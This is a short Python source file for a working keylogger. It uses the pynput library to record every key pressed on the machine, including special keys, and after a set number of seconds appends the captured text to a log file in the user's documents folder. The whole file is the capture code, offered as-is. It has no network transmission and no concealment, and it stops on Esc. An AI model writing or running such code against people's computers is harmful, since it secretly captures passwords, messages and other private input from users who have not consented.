from pynput import keyboard
from threading import Thread
from time import sleep
import os

from normalize_path import normalize_path_name


class Logger:
    def __init__(self, frequency, user_path, log = ''):
        self.log = log
        self.frequency = frequency
        self.user_path = user_path

    def init(self):
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:

            t = Thread(target=listener.join, daemon=True)

            t.start()

            sleep(self.frequency)

            with open(normalize_path_name(self.user_path, 'keylog_record', 'log.txt'), 'a+') as output_file:
                output_file.write(self.get_log())

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += ' '
            else:
                self.log += f' <{str(key)[4:]}> '

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def get_log(self):
        return self.log


if __name__ == '__main__':
    log = Logger(10, normalize_path_name(os.path.expanduser('~'), 'documents'))
    log.init()